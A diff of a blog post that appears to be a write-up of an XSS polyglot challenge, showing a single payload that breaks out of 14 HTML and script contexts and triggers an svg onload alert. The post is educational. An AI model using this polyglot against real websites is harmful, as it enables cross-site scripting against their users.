@@ -21,15 +21,25 @@ To start off, here is the challenge page with the official rules.
 
 ![challenge page](/assets/images/twitter/freddyb/challenge-page.png)
 
-Let's count how many contexts are there on the page
+Next, I need count how many times does the input reflect onto the page.
 
-![number-of-contexts](/assets//images/twitter/freddyb/number-of-contexts.png)
+![number-of-contexts](/assets//images/twitter/freddyb/reflected-input.png)
+
+There is a total of 14 places where the input gets reflected, all of which are in a different context.
 
 ## TL;DR Solution
+
+Here complete solution to trigger all 14 contexts.
 
 ```
 "%0Ax=//`//</style></title></math></select></template></textarea><svg+x=*/%0Aonload=alert()//></svg>
 ```
+
+To better understand the idea of this polyglot, I've made a viasual sketch.
+
+![polyglot overview](/assets//images/twitter/freddyb/polyglot-overview.png)
+
+However, if you'd like to see how all of this fits in detail, then follow along with this article!
 
 ## Detailed Solution
 
@@ -43,7 +53,7 @@ Let's count how many contexts are there on the page
 </script>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <script>
@@ -63,7 +73,7 @@ onload=alert()//&gt;&lt;/svg&gt;";
 </script>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <script>
@@ -83,7 +93,7 @@ onload=alert()//&gt;&lt;/svg&gt;`;
 </script>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <script>
@@ -103,7 +113,7 @@ onload=alert()//&gt;&lt;/svg&gt;
 </script>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <script>
@@ -122,7 +132,7 @@ onload=alert()//&gt;&lt;/svg&gt; */
 payload</style>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <style>
@@ -139,7 +149,7 @@ onload=alert()//></svg></style>
 <title>2021's vector to rule them all - payload</title></head>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <title>2021's vector to rule them all - "
@@ -156,7 +166,7 @@ onload=alert()//></svg></title></head>
     <select>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <main>    "
@@ -173,7 +183,7 @@ onload=alert()//></svg>
 <select><option>payload</option></select>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <select><option>"
@@ -189,7 +199,7 @@ onload=alert()//></svg></option></select>
 <textarea>payload</textarea>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <textarea>"
@@ -205,7 +215,7 @@ onload=alert()//></svg></textarea>
 <img src="payload" alt="" />
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <img src=""
@@ -221,7 +231,7 @@ onload=alert()//></svg>" alt="" />
 <template>payload</template>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <template>"
@@ -237,7 +247,7 @@ onload=alert()//></svg></template>
 <svg>payload</svg>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <svg>"
@@ -253,13 +263,7 @@ onload=alert()//></svg></svg>
 <math>payload</math>
 ```
 
-- Result of stand-alone payload `</math><svg+onload=alert()>`
-
-```html
-<math></math><svg onload=alert()></math>
-```
-
-- Polyglot result
+- Result from payload
 
 ```html
 <math>"
@@ -275,7 +279,7 @@ onload=alert()//></svg></math>
 <iframe data-injection="payload" src="data:text/html,<h1>Ignore me"></iframe>
 ```
 
-- Polyglot result
+- Result from payload
 
 ```html
 <iframe data-injection=""
@@ -283,3 +287,9 @@ x=//`//&lt;/style&gt;&lt;/title&gt;&lt;/math&gt;&lt;/select&gt;&lt;/template&gt;
 onload=alert()//&gt;&lt;/svg&gt;" src="data:text/html,<h1>Ignore me"></iframe>
 </main>
 ```
+
+---
+
+This is it. It took me a bunch of hours to solve this challenge, but it was worth it. It gave me a great introduction to polyglots.
+
+Thanks for reading.
